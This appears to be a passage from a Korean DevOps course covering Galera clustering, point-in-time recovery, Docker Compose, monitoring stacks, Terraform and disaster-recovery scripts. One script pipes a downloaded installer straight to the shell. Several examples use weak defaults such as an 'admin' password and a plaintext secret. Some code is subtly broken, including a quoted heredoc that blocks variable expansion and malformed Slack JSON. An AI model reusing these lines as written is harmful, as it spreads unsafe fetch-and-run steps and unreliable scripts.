await pool.query('INSERT INTO users ...');  # 모든 노드에 동기 복제
const [users] = await pool.query('SELECT * FROM users');  # 어느 노드에서든 읽기`},{heading:"4. 자동 Split-Brain 방지",code:`# Split-Brain: 네트워크 단절로 클러스터가 2개로 분리되는 현상

# 방지 방법 1: 쿼럼 (Quorum) 설정
# 과반수 노드가 살아있어야만 쓰기 허용
# 3노드 → 최소 2노드, 5노드 → 최소 3노드

# galera.cnf에 추가
wsrep_provider_options="pc.ignore_quorum=false;pc.ignore_sb=false"

# 테스트: 2개 노드 다운 시
docker-compose stop galera-node2 galera-node3

# node1에서 쓰기 시도
mysql -u root -p -e "INSERT INTO users VALUES (1, 'test')"
# ERROR: WSREP has not yet prepared node for application use
# → 쿼럼 부족으로 자동 읽기 전용 전환!

# 방지 방법 2: Arbitrator (중재자) 추가
# 데이터 없이 투표만 참여하는 경량 노드
docker run -d --name garbd \\
  --network mynet \\
  severalnines/garbd \\
  --address gcomm://galera-node1,galera-node2,galera-node3 \\
  --group my-galera-cluster

# 효과: 홀수 투표권 확보 (3노드 + 1 arbitrator = 4표)
# 2노드 다운 → 1노드 + arbitrator = 2표 (과반수 미달, 쓰기 차단)`},{heading:"5. Point-in-Time Recovery (PITR) 구현",code:`# 1. 증분 백업 설정
# XtraBackup으로 증분 백업
docker run --rm --volumes-from galera-node1 \\
  perconalab/percona-xtrabackup \\
  xtrabackup --backup --target-dir=/backup/full

# 6시간마다 증분 백업
docker run --rm --volumes-from galera-node1 \\
  perconalab/percona-xtrabackup \\
  xtrabackup --backup --incremental-basedir=/backup/full \\
  --target-dir=/backup/inc1

# 2. Binary Log 보관
# galera.cnf에 추가
log_bin = /var/log/mysql/mysql-bin.log
expire_logs_days = 7
sync_binlog = 1

# 3. PITR 복구 절차
# 시나리오: 2024-01-15 14:30에 실수로 테이블 삭제

# Step 1: 가장 최근 전체 백업 복원 (14:00 백업)
xtrabackup --prepare --target-dir=/backup/full
xtrabackup --copy-back --target-dir=/backup/full

# Step 2: Binary Log로 14:00 ~ 14:29:59까지 재실행
mysqlbinlog --start-datetime="2024-01-15 14:00:00" \\
            --stop-datetime="2024-01-15 14:29:59" \\
            /var/log/mysql/mysql-bin.* | mysql -u root -p

# 결과: 14:30 직전 상태로 복구!

# 자동화 스크립트
#!/bin/bash
# pitr-restore.sh

RESTORE_TIME="$1"  # 예: "2024-01-15 14:29:59"
BACKUP_DIR="/backup"

# 1. 복원 시점 이전의 가장 최근 백업 찾기
LATEST_BACKUP=$(find \${BACKUP_DIR} -type d -name "full-*" | sort -r | head -1)

# 2. 백업 복원
xtrabackup --prepare --target-dir=\${LATEST_BACKUP}
xtrabackup --copy-back --target-dir=\${LATEST_BACKUP}

# 3. Binary Log로 시점 복구
BACKUP_TIME=$(cat \${LATEST_BACKUP}/xtrabackup_binlog_info | awk '{print $3}')
mysqlbinlog --start-datetime="\${BACKUP_TIME}" \\
            --stop-datetime="\${RESTORE_TIME}" \\
            /var/log/mysql/mysql-bin.* | mysql -u root -p

echo "Restored to \${RESTORE_TIME}"`},{heading:"6. 멀티 데이터센터 배포",code:`# 지리적으로 분산된 Galera Cluster
# DC1: 서울 (2 nodes)
# DC2: 도쿄 (2 nodes)
# DC3: 싱가포르 (1 node + arbitrator)

# galera.cnf (각 노드)
wsrep_provider_options=" \\
  gmcast.segment=0; \\           # 세그먼트 ID (DC별로 다르게)
  evs.suspect_timeout=PT10S; \\  # 네트워크 지연 허용 10초
  evs.inactive_timeout=PT30S; \\
  evs.install_timeout=PT15S"

# 네트워크 레이턴시 고려
# 서울-도쿄: 30ms
# 서울-싱가포르: 70ms
# 도쿄-싱가포르: 80ms

# 쓰기 흐름:
# 1. 서울 노드에 INSERT
# 2. 모든 노드(도쿄, 싱가포르)에 동기 복제
# 3. 과반수(3/5) 노드 ACK → 커밋 완료
# 평균 쓰기 레이턴시: 70~100ms (WAN 환경)

# 읽기 최적화: GeoDNS로 가까운 DC 연결
# 한국 사용자 → 서울 노드
# 일본 사용자 → 도쿄 노드
# 동남아 사용자 → 싱가포르 노드

# ProxySQL에서 지연 기반 라우팅
INSERT INTO mysql_servers(hostgroup_id, hostname, weight) VALUES
  (1, 'seoul-node1', 100),      # 가중치 높음
  (1, 'tokyo-node1', 50),       # 지연 시간 고려
  (1, 'singapore-node1', 10);   # 지연 시간 가장 큼`},{heading:"⚡ 고급 실습 과제",checklist:["Galera Cluster 3노드 구성 후 모든 노드에서 쓰기 테스트","HAProxy로 로드 밸런싱 설정 및 노드 장애 시 자동 제외 확인","XtraBackup으로 증분 백업 후 PITR로 특정 시점 복구","Split-Brain 방지를 위한 Arbitrator 추가 및 쿼럼 테스트","2개 데이터센터에 Galera 노드 배포 후 지리적 분산 확인"]}]}}},{id:"4-4",name:"인프라 자동화 (IaC)",goal:"인프라를 코드로 관리할 수 있다",hours:18,keywords:["Infrastructure as Code","Docker Compose","disaster recovery"],tasks:[],content:{beginner:{title:"초급: Docker Compose로 멀티 컨테이너 환경 구성",sections:[{subtitle:"1. Docker Compose 기본 구조 이해",content:`Docker Compose는 여러 컨테이너를 YAML 파일 하나로 정의하고 관리하는 도구입니다.

**docker-compose.yml 기본 구조**:
\`\`\`yaml
version: '3.8'

services:
  # 웹 애플리케이션
  web:
    image: node:20-alpine
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=production
      - DB_HOST=db
    volumes:
      - ./app:/app
      - /app/node_modules
    depends_on:
      - db
      - redis
    networks:
      - app-network
    restart: unless-stopped

  # MySQL 데이터베이스
  db:
    image: mysql:8.0
    environment:
      - MYSQL_ROOT_PASSWORD=\${DB_PASSWORD}
      - MYSQL_DATABASE=myapp
    volumes:
      - mysql-data:/var/lib/mysql
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
    networks:
      - app-network
    restart: unless-stopped

  # Redis 캐시
  redis:
    image: redis:7-alpine
    volumes:
      - redis-data:/data
    networks:
      - app-network
    restart: unless-stopped

volumes:
  mysql-data:
  redis-data:

networks:
  app-network:
    driver: bridge
\`\`\`

**주요 개념**:
- **services**: 실행할 컨테이너들 정의
- **volumes**: 데이터 영속성 보장
- **networks**: 컨테이너 간 통신 네트워크
- **depends_on**: 시작 순서 제어
- **restart**: 재시작 정책`,checklist:["docker-compose.yml 파일 생성하고 웹/DB/캐시 서비스 정의","환경 변수를 .env 파일로 분리 (DB_PASSWORD 등)","docker-compose up -d로 전체 스택 실행","docker-compose ps로 모든 서비스 상태 확인","docker-compose logs -f web으로 로그 실시간 모니터링"]},{subtitle:"2. 환경별 설정 분리 (dev/staging/prod)",content:`환경별로 다른 설정을 사용하기 위해 Compose Override 기능을 활용합니다.

**베이스 설정 (docker-compose.yml)**:
\`\`\`yaml
version: '3.8'

services:
  web:
    image: myapp:latest
    environment:
      - NODE_ENV=production
    # 공통 설정들...
\`\`\`

**개발 환경 오버라이드 (docker-compose.dev.yml)**:
\`\`\`yaml
version: '3.8'

services:
  web:
    build:
      context: .
      dockerfile: Dockerfile.dev
    environment:
      - NODE_ENV=development
      - DEBUG=*
    volumes:
      - .:/app  # 소스 코드 실시간 반영
    ports:
      - "3000:3000"
      - "9229:9229"  # Node.js 디버거 포트
    command: npm run dev

  db:
    ports:
      - "3306:3306"  # 로컬 DB 클라이언트 접근
\`\`\`

**프로덕션 환경 오버라이드 (docker-compose.prod.yml)**:
\`\`\`yaml
version: '3.8'

services:
  web:
    deploy:
      replicas: 3
      resources:
        limits:
          cpus: '2'
          memory: 2G
        reservations:
          cpus: '1'
          memory: 1G
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"

  db:
    # 포트 외부 노출 안 함 (보안)
    # ports 섹션 없음
\`\`\`

**환경별 실행**:
\`\`\`bash
# 개발 환경
docker-compose -f docker-compose.yml -f docker-compose.dev.yml up

# 프로덕션 환경
docker-compose -f docker-compose.yml -f docker-compose.prod.yml up -d

# .env 파일로 환경 변수 주입
echo "DB_PASSWORD=secret123" > .env
docker-compose --env-file .env up
\`\`\``,checklist:["docker-compose.dev.yml 생성하고 볼륨 마운트로 핫 리로드 설정","docker-compose.prod.yml 생성하고 리소스 제한 설정","각 환경별로 실행해서 설정 차이 확인",".env.example 파일 생성하고 필요한 환경 변수 문서화","docker-compose config로 최종 병합된 설정 확인"]},{subtitle:"3. Health Check와 의존성 관리",content:`컨테이너가 실제로 준비되었는지 확인하는 Health Check를 설정합니다.

**Health Check 설정**:
\`\`\`yaml
version: '3.8'

services:
  web:
    image: myapp:latest
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:3000/health"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s
    depends_on:
      db:
        condition: service_healthy
      redis:
        condition: service_healthy

  db:
    image: mysql:8.0
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
      interval: 10s
      timeout: 5s
      retries: 5

  redis:
    image: redis:7-alpine
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 3s
      retries: 5
\`\`\`

**Wait-for-it 스크립트 사용** (더 정교한 대기):
\`\`\`yaml
services:
  web:
    image: myapp:latest
    command: >
      sh -c "
        ./wait-for-it.sh db:3306 -t 60 &&
        ./wait-for-it.sh redis:6379 -t 60 &&
        npm start
      "
    volumes:
      - ./wait-for-it.sh:/app/wait-for-it.sh
\`\`\`

**wait-for-it.sh**:
\`\`\`bash
#!/bin/bash
# https://github.com/vishnubob/wait-for-it

TIMEOUT=15
QUIET=0

while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--timeout)
      TIMEOUT="$2"
      shift 2
      ;;
    *)
      HOST=$(echo $1 | cut -d: -f1)
      PORT=$(echo $1 | cut -d: -f2)
      shift
      ;;
  esac
done

echo "Waiting for $HOST:$PORT..."

for i in \`seq $TIMEOUT\`; do
  nc -z $HOST $PORT && echo "Service is up!" && exit 0
  sleep 1
done

echo "Timeout waiting for $HOST:$PORT"
exit 1
\`\`\``,checklist:["모든 서비스에 healthcheck 설정 추가","docker-compose up 실행 후 서비스 시작 순서 확인","docker inspect로 health 상태 확인","DB 컨테이너를 일부러 중단시켜 재시작 동작 테스트","wait-for-it.sh 스크립트 다운로드 후 권한 설정 (chmod +x)"]}]},intermediate:{title:"중급: 인프라 백업/복구 자동화와 모니터링 통합",sections:[{subtitle:"1. 전체 인프라 백업/복구 자동화",content:`Docker 볼륨, 설정, 데이터베이스를 모두 백업하는 자동화 시스템을 구축합니다.

**backup-compose.yml** (백업 전용 스택):
\`\`\`yaml
version: '3.8'

services:
  # 정기 백업 서비스
  backup:
    image: alpine:latest
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - mysql-data:/backup/mysql:ro
      - redis-data:/backup/redis:ro
      - ./backups:/backups
      - ./backup.sh:/backup.sh
    environment:
      - AWS_ACCESS_KEY_ID=\${AWS_ACCESS_KEY_ID}
      - AWS_SECRET_ACCESS_KEY=\${AWS_SECRET_ACCESS_KEY}
      - S3_BUCKET=my-infra-backups
    command: >
      sh -c "
        apk add --no-cache docker-cli aws-cli &&
        crond -f
      "
    restart: unless-stopped

volumes:
  mysql-data:
    external: true
  redis-data:
    external: true
\`\`\`

**backup.sh** (전체 백업 스크립트):
\`\`\`bash
#!/bin/bash
set -e

DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/backups/\${DATE}"
mkdir -p \${BACKUP_DIR}

echo "🔄 Starting full infrastructure backup..."

# 1. Docker Compose 설정 백업
echo "📄 Backing up Docker Compose configs..."
cp /app/docker-compose.yml \${BACKUP_DIR}/
cp /app/.env \${BACKUP_DIR}/

# 2. MySQL 백업 (컨테이너 내부에서 실행)
echo "💾 Backing up MySQL..."
docker exec mysql mysqldump -u root -p\${MYSQL_ROOT_PASSWORD} \\
  --all-databases --single-transaction --quick \\
  | gzip > \${BACKUP_DIR}/mysql_\${DATE}.sql.gz

# 3. Redis 백업 (RDB 파일 복사)
echo "📦 Backing up Redis..."
docker exec redis redis-cli BGSAVE
sleep 5  # RDB 저장 대기
docker cp redis:/data/dump.rdb \${BACKUP_DIR}/redis_\${DATE}.rdb

# 4. Docker 볼륨 직접 백업
echo "📂 Backing up Docker volumes..."
tar czf \${BACKUP_DIR}/volumes_\${DATE}.tar.gz -C /backup mysql redis

# 5. 전체 백업을 하나로 압축
echo "🗜️  Compressing full backup..."
tar czf /backups/full_backup_\${DATE}.tar.gz -C /backups \${DATE}

# 6. S3 업로드
echo "☁️  Uploading to S3..."
aws s3 cp /backups/full_backup_\${DATE}.tar.gz \\
  s3://\${S3_BUCKET}/infra/\${DATE}/ \\
  --storage-class STANDARD_IA

# 7. 로컬 백업 정리 (7일 이상 된 것 삭제)
find /backups -name "full_backup_*.tar.gz" -mtime +7 -delete

echo "✅ Backup completed: \${DATE}"

# Slack 알림
curl -X POST \${SLACK_WEBHOOK_URL} \\
  -H 'Content-Type: application/json' \\
  -d "{"text":"✅ Infrastructure backup completed: \${DATE}"}"
\`\`\`

**Cron 설정** (매일 새벽 3시):
\`\`\`bash
# backup 컨테이너 내부의 /etc/crontabs/root
0 3 * * * /backup.sh >> /var/log/backup.log 2>&1
\`\`\`

**복구 스크립트 (restore.sh)**:
\`\`\`bash
#!/bin/bash
set -e

BACKUP_FILE=$1

if [ -z "$BACKUP_FILE" ]; then
  echo "Usage: ./restore.sh <backup_file.tar.gz>"
  exit 1
fi

echo "⚠️  WARNING: This will restore infrastructure from backup!"
read -p "Continue? (yes/no): " confirm

if [ "$confirm" != "yes" ]; then
  exit 0
fi

# 1. 기존 스택 중단
echo "🛑 Stopping current stack..."
docker-compose down

# 2. 백업 압축 해제
echo "📦 Extracting backup..."
tar xzf $BACKUP_FILE -C /tmp/

BACKUP_DIR=$(tar tzf $BACKUP_FILE | head -1 | cut -f1 -d"/")

# 3. 설정 파일 복원
echo "📄 Restoring configs..."
cp /tmp/\${BACKUP_DIR}/docker-compose.yml ./
cp /tmp/\${BACKUP_DIR}/.env ./

# 4. MySQL 복원
echo "💾 Restoring MySQL..."
docker-compose up -d db
sleep 10
gunzip < /tmp/\${BACKUP_DIR}/mysql_*.sql.gz | \\
  docker exec -i mysql mysql -u root -p\${MYSQL_ROOT_PASSWORD}

# 5. Redis 복원
echo "📦 Restoring Redis..."
docker cp /tmp/\${BACKUP_DIR}/redis_*.rdb redis:/data/dump.rdb
docker-compose restart redis

# 6. 전체 스택 재시작
echo "🚀 Starting full stack..."
docker-compose up -d

echo "✅ Restore completed!"
\`\`\``,checklist:["backup-compose.yml 생성하고 백업 서비스 실행","backup.sh 스크립트 작성 후 수동 실행으로 테스트","S3 버킷 생성 및 AWS 자격 증명 설정","Cron으로 매일 자동 백업 설정","restore.sh로 백업 파일 하나 선택해서 복구 테스트"]},{subtitle:"2. Prometheus + Grafana 모니터링 통합",content:`Docker Compose에 모니터링 스택을 통합하여 인프라 전체를 모니터링합니다.

**monitoring-compose.yml**:
\`\`\`yaml
version: '3.8'

services:
  # Prometheus (메트릭 수집)
  prometheus:
    image: prom/prometheus:latest
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
      - prometheus-data:/prometheus
    command:
      - '--config.file=/etc/prometheus/prometheus.yml'
      - '--storage.tsdb.retention.time=30d'
    ports:
      - "9090:9090"
    networks:
      - monitoring

  # Grafana (시각화)
  grafana:
    image: grafana/grafana:latest
    volumes:
      - grafana-data:/var/lib/grafana
      - ./grafana/provisioning:/etc/grafana/provisioning
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
      - GF_USERS_ALLOW_SIGN_UP=false
    ports:
      - "3001:3000"
    networks:
      - monitoring
    depends_on:
      - prometheus

  # Node Exporter (호스트 메트릭)
  node-exporter:
    image: prom/node-exporter:latest
    volumes:
      - /proc:/host/proc:ro
      - /sys:/host/sys:ro
      - /:/rootfs:ro
    command:
      - '--path.procfs=/host/proc'
      - '--path.sysfs=/host/sys'
      - '--collector.filesystem.mount-points-exclude=^/(sys|proc|dev|host|etc)($$|/)'
    ports:
      - "9100:9100"
    networks:
      - monitoring

  # cAdvisor (컨테이너 메트릭)
  cadvisor:
    image: gcr.io/cadvisor/cadvisor:latest
    volumes:
      - /:/rootfs:ro
      - /var/run:/var/run:ro
      - /sys:/sys:ro
      - /var/lib/docker/:/var/lib/docker:ro
    ports:
      - "8080:8080"
    networks:
      - monitoring

  # MySQL Exporter (DB 메트릭)
  mysql-exporter:
    image: prom/mysqld-exporter:latest
    environment:
      - DATA_SOURCE_NAME=exporter:password@(db:3306)/
    ports:
      - "9104:9104"
    networks:
      - monitoring
      - app-network

  # Redis Exporter (캐시 메트릭)
  redis-exporter:
    image: oliver006/redis_exporter:latest
    environment:
      - REDIS_ADDR=redis:6379
    ports:
      - "9121:9121"
    networks:
      - monitoring
      - app-network

volumes:
  prometheus-data:
  grafana-data:

networks:
  monitoring:
    driver: bridge
  app-network:
    external: true
\`\`\`

**prometheus.yml** (Prometheus 설정):
\`\`\`yaml
global:
  scrape_interval: 15s
  evaluation_interval: 15s

scrape_configs:
  # Prometheus 자체 모니터링
  - job_name: 'prometheus'
    static_configs:
      - targets: ['localhost:9090']

  # 호스트 메트릭
  - job_name: 'node-exporter'
    static_configs:
      - targets: ['node-exporter:9100']

  # 컨테이너 메트릭
  - job_name: 'cadvisor'
    static_configs:
      - targets: ['cadvisor:8080']

  # MySQL 메트릭
  - job_name: 'mysql'
    static_configs:
      - targets: ['mysql-exporter:9104']

  # Redis 메트릭
  - job_name: 'redis'
    static_configs:
      - targets: ['redis-exporter:9121']

  # 애플리케이션 메트릭 (Node.js prom-client)
  - job_name: 'app'
    static_configs:
      - targets: ['web:3000']
    metrics_path: '/metrics'
\`\`\`

**전체 스택 실행**:
\`\`\`bash
# 앱 + 모니터링 동시 실행
docker-compose -f docker-compose.yml -f monitoring-compose.yml up -d

# Grafana 접속: http://localhost:3001
# 기본 로그인: admin / admin

# Prometheus 쿼리 예시
# - 컨테이너 CPU: container_cpu_usage_seconds_total
# - MySQL 쿼리 수: mysql_global_status_queries
# - Redis 메모리: redis_memory_used_bytes
\`\`\``,checklist:["monitoring-compose.yml 생성하고 모니터링 스택 실행","Prometheus UI(9090)에서 모든 타겟이 UP 상태인지 확인","Grafana(3001)에서 Prometheus 데이터소스 추가","Grafana에서 Docker Dashboard 임포트 (ID: 179, 193)","앱에 부하를 주고 CPU/메모리 메트릭 실시간 확인"]},{subtitle:"3. 로그 중앙화 (Loki + Promtail)",content:`모든 컨테이너 로그를 Loki에 수집하고 Grafana에서 통합 조회합니다.

**logging-compose.yml**:
\`\`\`yaml
version: '3.8'

services:
  # Loki (로그 저장소)
  loki:
    image: grafana/loki:latest
    ports:
      - "3100:3100"
    volumes:
      - ./loki-config.yml:/etc/loki/local-config.yaml
      - loki-data:/loki
    command: -config.file=/etc/loki/local-config.yaml
    networks:
      - monitoring

  # Promtail (로그 수집 에이전트)
  promtail:
    image: grafana/promtail:latest
    volumes:
      - /var/log:/var/log:ro
      - /var/lib/docker/containers:/var/lib/docker/containers:ro
      - ./promtail-config.yml:/etc/promtail/config.yml
    command: -config.file=/etc/promtail/config.yml
    networks:
      - monitoring

volumes:
  loki-data:

networks:
  monitoring:
    external: true
\`\`\`

**loki-config.yml**:
\`\`\`yaml
auth_enabled: false

server:
  http_listen_port: 3100

ingester:
  lifecycler:
    ring:
      kvstore:
        store: inmemory
      replication_factor: 1

schema_config:
  configs:
    - from: 2024-01-01
      store: boltdb-shipper
      object_store: filesystem
      schema: v11
      index:
        prefix: index_
        period: 24h

storage_config:
  boltdb_shipper:
    active_index_directory: /loki/index
    cache_location: /loki/cache
  filesystem:
    directory: /loki/chunks

limits_config:
  retention_period: 168h  # 7일 보관
\`\`\`

**promtail-config.yml**:
\`\`\`yaml
server:
  http_listen_port: 9080

positions:
  filename: /tmp/positions.yaml

clients:
  - url: http://loki:3100/loki/api/v1/push

scrape_configs:
  # Docker 컨테이너 로그 수집
  - job_name: docker
    static_configs:
      - targets:
          - localhost
        labels:
          job: docker
          __path__: /var/lib/docker/containers/*/*.log
    pipeline_stages:
      - json:
          expressions:
            output: log
            stream: stream
            container_name: attrs.name
      - labels:
          container_name:
          stream:
      - output:
          source: output
\`\`\`

**Grafana에서 Loki 연동**:
\`\`\`bash
# Grafana Data Source 추가
# URL: http://loki:3100

# LogQL 쿼리 예시
{container_name="web"} |= "ERROR"
{container_name="db"} |= "slow query"
{job="docker"} | json | line_format "{{.container_name}}: {{.log}}"
\`\`\``,checklist:["logging-compose.yml 생성하고 Loki + Promtail 실행","Grafana에서 Loki 데이터소스 추가 (http://loki:3100)",'Explore 탭에서 {container_name="web"} 쿼리로 로그 확인','에러 로그만 필터링하는 쿼리 작성 (|= "ERROR")',"로그 + 메트릭 통합 대시보드 생성 (CPU 높을 때 로그 연동)"]}]},advanced:{title:"고급: Terraform으로 인프라 코드화 및 재해 복구",sections:[{subtitle:"1. Terraform으로 CapRover 인프라 관리",content:`Terraform을 사용해 CapRover 서버와 Docker 리소스를 코드로 관리합니다.

**프로젝트 구조**:
\`\`\`
terraform/
├── main.tf              # 메인 설정
├── variables.tf         # 변수 정의
├── outputs.tf          # 출력값
├── provider.tf         # 프로바이더 설정
├── modules/
│   ├── caprover/       # CapRover 모듈
│   ├── docker/         # Docker 리소스 모듈
│   └── monitoring/     # 모니터링 스택 모듈
└── environments/
    ├── dev.tfvars
    ├── staging.tfvars
    └── prod.tfvars
\`\`\`

**provider.tf** (Docker Provider 사용):
\`\`\`hcl
terraform {
  required_providers {
    docker = {
      source  = "kreuzwerker/docker"
      version = "~> 3.0"
    }
  }

  # 상태 저장소 (S3 백엔드)
  backend "s3" {
    bucket = "my-terraform-state"
    key    = "caprover/terraform.tfstate"
    region = "ap-northeast-2"
  }
}

provider "docker" {
  host = "unix:///var/run/docker.sock"
}
\`\`\`

**main.tf** (Docker 네트워크 및 볼륨):
\`\`\`hcl
# Docker 네트워크
resource "docker_network" "app_network" {
  name   = "app-network"
  driver = "bridge"
}

# MySQL 볼륨
resource "docker_volume" "mysql_data" {
  name = "mysql-data"
}

# Redis 볼륨
resource "docker_volume" "redis_data" {
  name = "redis-data"
}

# MySQL 컨테이너
resource "docker_container" "mysql" {
  name  = "mysql"
  image = docker_image.mysql.image_id

  env = [
    "MYSQL_ROOT_PASSWORD=\${var.mysql_root_password}",
    "MYSQL_DATABASE=\${var.mysql_database}"
  ]

  volumes {
    volume_name    = docker_volume.mysql_data.name
    container_path = "/var/lib/mysql"
  }

  networks_advanced {
    name = docker_network.app_network.name
  }

  restart = "unless-stopped"

  healthcheck {
    test     = ["CMD", "mysqladmin", "ping", "-h", "localhost"]
    interval = "10s"
    timeout  = "5s"
    retries  = 5
  }
}

# Redis 컨테이너
resource "docker_container" "redis" {
  name  = "redis"
  image = docker_image.redis.image_id

  volumes {
    volume_name    = docker_volume.redis_data.name
    container_path = "/data"
  }

  networks_advanced {
    name = docker_network.app_network.name
  }

  restart = "unless-stopped"
}

# 웹 애플리케이션 컨테이너
resource "docker_container" "web" {
  name  = "web"
  image = docker_image.app.image_id

  env = [
    "NODE_ENV=\${var.environment}",
    "DB_HOST=mysql",
    "REDIS_HOST=redis"
  ]

  ports {
    internal = 3000
    external = var.app_port
  }

  networks_advanced {
    name = docker_network.app_network.name
  }

  depends_on = [
    docker_container.mysql,
    docker_container.redis
  ]

  restart = "unless-stopped"
}

# Docker 이미지
resource "docker_image" "mysql" {
  name = "mysql:8.0"
}

resource "docker_image" "redis" {
  name = "redis:7-alpine"
}

resource "docker_image" "app" {
  name = "\${var.app_image}:\${var.app_version}"
}
\`\`\`

**variables.tf**:
\`\`\`hcl
variable "environment" {
  description = "Environment name"
  type        = string
  default     = "production"
}

variable "mysql_root_password" {
  description = "MySQL root password"
  type        = string
  sensitive   = true
}

variable "mysql_database" {
  description = "MySQL database name"
  type        = string
  default     = "myapp"
}

variable "app_image" {
  description = "Application Docker image"
  type        = string
}

variable "app_version" {
  description = "Application version tag"
  type        = string
  default     = "latest"
}

variable "app_port" {
  description = "Application external port"
  type        = number
  default     = 3000
}
\`\`\`

**environments/prod.tfvars**:
\`\`\`hcl
environment   = "production"
app_image     = "myregistry/myapp"
app_version   = "v1.2.3"
app_port      = 80
mysql_database = "myapp_prod"
\`\`\`

**Terraform 실행**:
\`\`\`bash
# 초기화
terraform init

# 계획 확인
terraform plan -var-file=environments/prod.tfvars

# 적용
terraform apply -var-file=environments/prod.tfvars

# 특정 리소스만 재생성
terraform taint docker_container.web
terraform apply

# 전체 인프라 제거
terraform destroy -var-file=environments/prod.tfvars
\`\`\``,checklist:["Terraform 설치 및 provider.tf 작성","main.tf에 Docker 네트워크/볼륨/컨테이너 정의","terraform plan으로 변경 사항 미리보기","terraform apply로 인프라 프로비저닝","웹 컨테이너 설정 변경 후 terraform apply로 무중단 업데이트"]},{subtitle:"2. 재해 복구 계획 (Disaster Recovery)",content:`전체 인프라를 다른 리전/서버에 빠르게 복구하는 자동화 시스템을 구축합니다.

**DR(재해 복구) 전략 - RTO/RPO 정의**:
- **RTO (Recovery Time Objective)**: 목표 복구 시간 - 30분
- **RPO (Recovery Point Objective)**: 목표 복구 시점 - 15분

**dr-plan.sh** (재해 복구 자동화):
\`\`\`bash
#!/bin/bash
set -e

DR_REGION="us-west-2"  # Primary: ap-northeast-2
DR_SERVER="dr-server.example.com"
BACKUP_BUCKET="s3://my-dr-backups"

echo "🚨 Starting Disaster Recovery Process..."

# 1. 최신 백업 확인
echo "📦 Finding latest backup..."
LATEST_BACKUP=$(aws s3 ls \${BACKUP_BUCKET}/infra/ | sort | tail -n 1 | awk '{print $4}')

if [ -z "$LATEST_BACKUP" ]; then
  echo "❌ No backup found!"
  exit 1
fi

echo "✅ Latest backup: $LATEST_BACKUP"

# 2. DR 서버에 SSH 접속하여 복구 시작
echo "🔗 Connecting to DR server..."
ssh ubuntu@\${DR_SERVER} << 'EOF'
  # Docker 설치 확인
  if ! command -v docker &> /dev/null; then
    echo "Installing Docker..."
    curl -fsSL https://get.docker.com | sh
    sudo usermod -aG docker ubuntu
  fi

  # Terraform 설치 확인
  if ! command -v terraform &> /dev/null; then
    echo "Installing Terraform..."
    wget https://releases.hashicorp.com/terraform/1.6.0/terraform_1.6.0_linux_amd64.zip
    unzip terraform_1.6.0_linux_amd64.zip
    sudo mv terraform /usr/local/bin/
  fi

  # 백업 다운로드
  aws s3 cp \${BACKUP_BUCKET}/infra/\${LATEST_BACKUP} ./backup.tar.gz

  # 백업 압축 해제
  tar xzf backup.tar.gz

  # Terraform 상태 복구
  cd terraform
  terraform init -backend-config="bucket=my-dr-terraform-state"
  terraform apply -auto-approve -var-file=environments/dr.tfvars

  # Docker Compose로 서비스 시작
  docker-compose -f docker-compose.yml up -d

  # 데이터베이스 복구
  gunzip < backup/mysql_*.sql.gz | docker exec -i mysql mysql -u root -p\${MYSQL_ROOT_PASSWORD}

  # Health Check
  echo "🏥 Running health checks..."
  sleep 30
  curl -f http://localhost/health || exit 1

  echo "✅ DR recovery completed!"
EOF

# 3. DNS 업데이트 (Route53)
echo "🌐 Updating DNS to DR server..."
aws route53 change-resource-record-sets \\
  --hosted-zone-id Z1234567890ABC \\
  --change-batch '{
    "Changes": [{
      "Action": "UPSERT",
      "ResourceRecordSet": {
        "Name": "app.example.com",
        "Type": "A",
        "TTL": 60,
        "ResourceRecords": [{"Value": "'$(dig +short \${DR_SERVER})'"}]
      }
    }]
  }'

# 4. Slack 알림
curl -X POST \${SLACK_WEBHOOK_URL} \\
  -H 'Content-Type: application/json' \\
  -d '{
    "text": "🚨 Disaster Recovery activated! Services running on DR server.",
    "attachments": [{
      "color": "warning",
      "fields": [
        {"title": "Backup Used", "value": "'\${LATEST_BACKUP}'", "short": true},
        {"title": "DR Server", "value": "'\${DR_SERVER}'", "short": true}
      ]
    }]
  }'

echo "✅ Disaster Recovery completed successfully!"
echo "🌐 Services now running on: \${DR_SERVER}"
\`\`\`

**DR 테스트 자동화** (매월 실행):
\`\`\`bash
#!/bin/bash
# dr-test.sh - 재해 복구 훈련

echo "🧪 Starting DR Test (non-destructive)..."

# 1. 테스트용 DR 서버 프로비저닝 (Terraform)
cd terraform
terraform workspace new dr-test
terraform apply -auto-approve -var-file=environments/dr-test.tfvars

# 2. 최신 백업으로 복구 테스트
./dr-plan.sh --test-mode

# 3. 성능 테스트 (k6)
k6 run --vus 100 --duration 5m load-test.js

# 4. 결과 리포트 생성
cat > dr-test-report.md << EOF
# DR Test Report - $(date +%Y-%m-%d)

## Summary
- **RTO Achieved**: \${RTO_MINUTES} minutes
- **RPO Achieved**: \${RPO_MINUTES} minutes
- **Performance**: \${PERFORMANCE_SCORE}/100

## Services Status
- Web: ✅ Healthy
- Database: ✅ Healthy
- Cache: ✅ Healthy

## Recommendations
- Update DNS TTL to 60 seconds for faster failover
- Increase backup frequency to every 10 minutes
EOF

# 5. 테스트 환경 정리
terraform workspace select default
terraform destroy -auto-approve

echo "✅ DR Test completed. Report: dr-test-report.md"
\`\`\`

**자동 페일오버 (Health Check 기반)**:
\`\`\`bash
#!/bin/bash
# auto-failover.sh - Cron으로 매분 실행

PRIMARY_URL="https://app.example.com/health"
DR_TRIGGER_THRESHOLD=3  # 3번 연속 실패 시 DR 발동

FAIL_COUNT=$(cat /tmp/fail_count 2>/dev/null || echo 0)

if ! curl -sf \${PRIMARY_URL} > /dev/null; then
  FAIL_COUNT=$((FAIL_COUNT + 1))
  echo \${FAIL_COUNT} > /tmp/fail_count

  if [ \${FAIL_COUNT} -ge \${DR_TRIGGER_THRESHOLD} ]; then
    echo "🚨 PRIMARY DOWN! Triggering DR..."
    ./dr-plan.sh
    echo 0 > /tmp/fail_count
  fi
else
  echo 0 > /tmp/fail_count
fi
